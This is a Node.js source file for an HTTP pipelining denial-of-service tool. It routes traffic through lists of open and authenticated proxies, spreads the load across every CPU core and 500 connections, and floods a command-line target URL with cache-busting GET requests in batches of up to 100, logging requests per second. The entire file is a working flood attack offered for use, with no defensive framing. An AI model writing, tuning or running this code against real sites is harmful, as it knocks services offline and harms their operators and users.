// R10-7: REQUEST-PIPELINE - HTTP Pipelining Attack
// Focus: Maximize requests per connection
// Technique: Send multiple requests before reading response
// Updated: Support authenticated proxies

const net = require('net');
const tls = require('tls');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Parse proxy line - supports both formats: host:port and host:port:username:password
function parseProxy(proxyLine) {
    const parts = proxyLine.split(':');
    if (parts.length === 4) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            username: parts[2],
            password: parts[3],
            auth: true
        };
    } else if (parts.length >= 2) {
        return {
            host: parts[0],
            port: parseInt(parts[1]),
            auth: false
        };
    }
    return null;
}

// Load proxies and user agents
try {
    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
    
    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
    console.log(`[R10-7] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
} catch (e) {
    console.log('[R10-7] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
} catch (e) {}

class PipelineConnection {
    constructor(target, proxy) {
        this.target = target;
        this.proxy = proxy;
        this.queue = [];
        this.connected = false;
        this.socket = null;
        this.connect();
    }
    
    connect() {
        const proxyHost = this.proxy.host;
        const proxyPort = this.proxy.port;
        
        const netSocket = net.connect(proxyPort, proxyHost);
        
        // Build CONNECT request with optional auth
        let connectReq = `CONNECT ${this.target.hostname}:443 HTTP/1.1\r\nHost: ${this.target.hostname}:443\r\n`;
        
        if (this.proxy.auth) {
            const auth = Buffer.from(`${this.proxy.username}:${this.proxy.password}`).toString('base64');
            connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
        }
        
        connectReq += '\r\n';
        
        netSocket.write(connectReq);
        
        netSocket.once('data', () => {
            this.socket = tls.connect({
                socket: netSocket,
                servername: this.target.hostname,
                rejectUnauthorized: false
            }, () => {
                this.connected = true;
                this.processQueue();
            });
            
            this.socket.on('error', () => this.connected = false);
            this.socket.on('close', () => this.connected = false);
        });
        
        netSocket.on('error', () => this.connected = false);
        netSocket.on('close', () => this.connected = false);
    }
    
    processQueue() {
        if (!this.connected || this.queue.length === 0) return;
        
        // Pipeline multiple requests
        const batch = this.queue.splice(0, 100);
        const requests = batch.join('');
        
        this.socket.write(requests);
        this.socket.once('data', () => {
            setImmediate(() => this.processQueue());
        });
    }
    
    queueRequest() {
        const ua = userAgents.length > 0 
            ? userAgents[Math.floor(Math.random() * userAgents.length)]
            : 'Mozilla/5.0';
        
        const request = `GET ${this.target.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${this.target.hostname}\r\nUser-Agent: ${ua}\r\n\r\n`;
        this.queue.push(request);
        
        if (this.connected) {
            this.processQueue();
        }
    }
}

if (cluster.isMaster) {
    console.log(`[R10-7] REQUEST-PIPELINE launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = new URL(process.argv[2]);
    const time = process.argv[3] || 300;
    
    const connections = [];
    let requestCount = 0;
    
    // Create connection pool
    for (let i = 0; i < 500; i++) {
        if (proxies.length === 0) continue;
        
        const proxy = proxies[i % proxies.length];
        const conn = new PipelineConnection(target, proxy);
        connections.push(conn);
        
        setTimeout(() => {
            setInterval(() => {
                conn.queueRequest();
                requestCount++;
            }, 5);
        }, i * 10);
    }
    
    setInterval(() => {
        console.log(`[R10-7] RPS: ${requestCount} | Connections: ${connections.length}`);
        requestCount = 0;
    }, 1000);
    
    setTimeout(() => process.exit(0), time * 1000);
}